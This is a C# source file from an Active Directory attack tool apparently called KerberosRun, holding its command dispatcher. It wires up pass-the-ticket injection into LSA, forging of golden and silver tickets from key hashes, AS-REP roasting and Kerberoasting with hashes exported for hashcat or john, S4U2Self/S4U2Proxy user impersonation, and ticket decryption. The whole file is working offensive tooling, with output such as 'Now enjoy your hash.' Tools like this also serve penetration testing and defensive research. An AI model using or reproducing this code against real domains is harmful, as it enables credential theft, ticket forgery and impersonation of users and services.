using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using Kerberos.NET.Transport;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KerberosRun
{
    class Commands
    {
        public static string kdc = null;
        public static ILoggerFactory logger = null;
        public static string username = null;
        public static bool isUncontrainedDeleg = false;
        public static bool outKirbi = true;
        public static string domainname = null;
        public static KrbAsRep asRep = null;
        public static string hash = string.Empty;
        public static EncryptionType etype = EncryptionType.RC4_HMAC_NT;
        public static string tgtHash = string.Empty;
        public static string tgsHash = string.Empty;
        public static EncryptionType dEtype = EncryptionType.AES256_CTS_HMAC_SHA1_96;


        public static void PTT(string ticket)
        {
            Console.WriteLine("[*] Importing Ticket...");
            if (Utils.Utils.IsBase64String(ticket))
            {
                var kirbiBytes = Convert.FromBase64String(ticket);
                PrintFunc.PrintKirbi(ticket);
                LSA.ImportTicket(kirbiBytes, new LUID());
                Environment.Exit(0);
            }
            else if (File.Exists(ticket))
            {
                byte[] kirbiBytes = File.ReadAllBytes(ticket);
                PrintFunc.PrintKirbi(Convert.ToBase64String(kirbiBytes));
                LSA.ImportTicket(kirbiBytes, new LUID());
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("\r\n[x]Ticket must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                Environment.Exit(0);
            }
        }

        public static async Task ResolveCmd(Options options)
        {
            var transport = new TcpKerberosTransport(logger, kdc);
            if (options.User != null)
            {
                username =  options.User.ToLower();
            }
            


            if (options.Ticket != null)
            {
                PTT(options.Ticket);
            }

            if ((options.RC4 ?? options.AES128 ?? options.AES256) != null)
            {
                hash = options.RC4 ?? options.AES128 ?? options.AES256;
                if (options.AES128 != null)
                {
                    etype = EncryptionType.AES128_CTS_HMAC_SHA1_96;
                }
                else if (options.AES256 != null)
                {
                    etype = EncryptionType.AES256_CTS_HMAC_SHA1_96;
                }
            }
           
            if ( options.Golden != options.Sliver)
            {
                if (options.Domain == null)
                {
                    Console.WriteLine("[x] Please provide the target domain name.");
                    Environment.Exit(0);
                }
                //Build Ticket
                if (options.Sliver)
                {
                    //var sliverTicket = 
                    BuildTicket.BuildSliver(options.Host, hash, etype, username, options.Domain, options.Service, options.DomainSID,
                   options.PTT, options.Verbose);
                }
                else
                {
                    //var goldenTicket = 
                    BuildTicket.BuildGolden(hash, etype, username, options.Domain, options.UserID, options.DomainSID,
                    options.PTT, options.Verbose);
                }
                Environment.Exit(0);
            }




            //Domain
            if (options.Domain != null)
            {
                try
                {
                    var context = new DirectoryContext(DirectoryContextType.Domain, options.Domain);
                    domainname = Domain.GetDomain(context).Name;
                }
                catch (Exception e) { Console.WriteLine(e.Message); Environment.Exit(0); }
            }
            else
            {
                try { domainname = Domain.GetCurrentDomain().Name; }
                catch (Exception e) { Console.WriteLine("[*] {0}", e.Message); Environment.Exit(0); }
            }



            if (options.DecryptTGT != null || options.DecryptTGS != null)
            {
                if (options.DecryptEtype == null)
                {
                    Console.WriteLine("[x] Please provide the encrytion type of the Hash (rc4/aes128/aes256)");
                    Console.WriteLine();
                    Environment.Exit(0);
                }
                switch (options.DecryptEtype.Trim().ToLower())
                {
                    case "rc4":
                        dEtype = EncryptionType.RC4_HMAC_NT;
                        break;
                    case "aes128":
                        dEtype = EncryptionType.AES128_CTS_HMAC_SHA1_96;
                        break;
                    default:
                        dEtype = EncryptionType.AES256_CTS_HMAC_SHA1_96;
                        break;
                }
                if (options.DecryptTGT != null)
                {
                    tgtHash = options.DecryptTGT;
                }
                else if (options.DecryptTGS != null)
                {
                    if (string.IsNullOrEmpty(options.SrvName))
                    {
                        Console.WriteLine("[x] Please provide the service account name for decrypting TGS.");
                        Environment.Exit(0);
                    }
                    tgsHash = options.DecryptTGS;
                }
            }


            if (!string.IsNullOrEmpty(username))
            {
                ////////////////////////////////////////////////////////////
                //ASREPRoasting
                if (options.Asreproast)
                {
                    bool asreproast = true;
                    if (options.Format.ToLower() == "john" || options.Format.ToLower() == "hashcat")
                    {
                        await Ask.askTGT(kdc, logger, transport, username, "whatever", domainname,
                            outKirbi, options.Verbose, options.Format.ToLower(), asreproast, options.PTT, hash, etype, options.Outfile,
                                tgtHash, dEtype);
                        Console.WriteLine("[+] Done! Now enjoy your hash.");
                    }
                    else
                    {
                        Console.WriteLine("[x] Unknown hash format, Please use hashcat or john");
                    }
                }
                else
                {
                    if (options.Pass == null && options.RC4 == null && options.AES128 == null && options.AES256 == null)
                    {
                        Console.WriteLine("[x] Please provide a valid password/hash");
                        Environment.Exit(1);
                    }
                    else
                    {
                        ////////////////////////////////////////////////////////////
                        //Ask TGT
                        if (options.AskTGT)
                        {
                            await Ask.askTGT(kdc, logger, transport, username, options.Pass, domainname,
                                outKirbi, options.Verbose, options.Format.ToLower(), false, options.PTT, hash, etype, options.Outfile,
                                tgtHash, dEtype);
                            
                        }
                        ////////////////////////////////////////////////////////////
                        //Ask TGS
                        else if (options.AskTGS)
                        {
                            if (options.Spn != null)
                            {
                                asRep = await Ask.askTGT(kdc, logger, transport, username, options.Pass, domainname,
                                outKirbi, options.Verbose, options.Format.ToLower(), false, options.PTT, hash, etype, options.Outfile,
                                tgtHash, dEtype);
                                await Ask.askTGS(kdc, logger, transport, asRep, username, options.Pass, domainname,
                                    options.Spn, isUncontrainedDeleg, outKirbi, options.Verbose, false, options.PTT, hash, etype,
                                    options.Outfile, options.SrvName, tgsHash, dEtype);
                            }
                            else { Console.WriteLine("[x] Please provide an SPN for the service request."); }
                        }
                        ////////////////////////////////////////////////////////////
                        //Kerberoasting
                        else if (options.Kerberoast)
                        {
                            bool kerberoast = true;
                            if (options.Spn != null)
                            {
                                asRep = await Ask.askTGT(kdc, logger, transport, username, options.Pass, domainname,
                                outKirbi, options.Verbose, options.Format.ToLower(), false, options.PTT, hash, etype, options.Outfile,
                                tgtHash, dEtype);
                                await Ask.askTGS(kdc, logger, transport, asRep, username, options.Pass, domainname,
                                    options.Spn, isUncontrainedDeleg, outKirbi, options.Verbose, kerberoast, options.PTT, hash, etype,
                                    options.Outfile, options.SrvName, tgsHash, dEtype);
                                Console.WriteLine("[+] Done! Now enjoy your hash.");
                            }
                            else { Console.WriteLine("[x] Please provide an SPN for Kerberoasting"); }
                        }


                        ////////////////////////////////////////////////////////////
                        //S4U
                        else if (options.S4U)
                        {
                            if (options.Impersonate != null && options.Spn != null)
                            {
                                asRep = await Ask.askTGT(kdc, logger, transport, username, options.Pass, domainname,
                                    outKirbi, options.Verbose, options.Format, options.Asreproast, options.PTT, hash, etype, options.Outfile,
                                tgtHash, dEtype);

                                var s4u2self = await S4U.S4U2Self(kdc, logger, transport, asRep, username, options.Pass, domainname,
                                    options.Impersonate, outKirbi, options.Verbose, options.PTT, hash, etype);

                                await S4U.S4U2Proxy(kdc, logger, transport, asRep, s4u2self, username, options.Pass, domainname,
                                    options.Impersonate, options.Spn, outKirbi, options.Verbose, options.PTT, hash, etype);

                                Console.WriteLine("[+] Done! Now enjoy your ticket for {0}.", options.Spn);
                            }
                            else
                            {
                                Console.WriteLine("[x] Please provide an SPN and a username to impersonate");
                            }
                        }



                        ////////////////////////////////////////////////////////////
                        //S4U2Self
                        else if (options.S4U2Self)
                        {
                            if (options.Impersonate != null)
                            {
                                string impersonate = options.Impersonate + "@" + domainname;
                                asRep = await Ask.askTGT(kdc, logger, transport, username, options.Pass, domainname,
                                    outKirbi, options.Verbose, options.Format, options.Asreproast, options.PTT, hash, etype, options.Outfile,
                                tgtHash, dEtype);

                                await S4U.S4U2Self(kdc, logger, transport, asRep, username, options.Pass, domainname,
                                    impersonate, outKirbi, options.Verbose, options.PTT, hash, etype);

                                Console.WriteLine("[+] Done! Now enjoy your ticket.");
                            }
                            else
                            {
                                Console.WriteLine("[x] Please provide a username to impersonate");
                            }
                        }
                    }
                }
            }


            //var flags = await Ask.askTGS(kdc, logger, transport, asRep, username, password, domainName, spn, isUncontrainedDeleg, outKirbi);
            ////IF the target service has Unconstrained Delegation
            //if (flags.HasFlag(TicketFlags.OkAsDelegate))
            //{
            //    Console.WriteLine("\n[*] Target Server is Trusted For Delegation, asking Forwarded TGT...");
            //    await Ask.askTGS(kdc, logger, transport, asRep, username, password, domainName, spn, isUncontrainedDeleg, outKirbi);
            //}
        }




    }
}
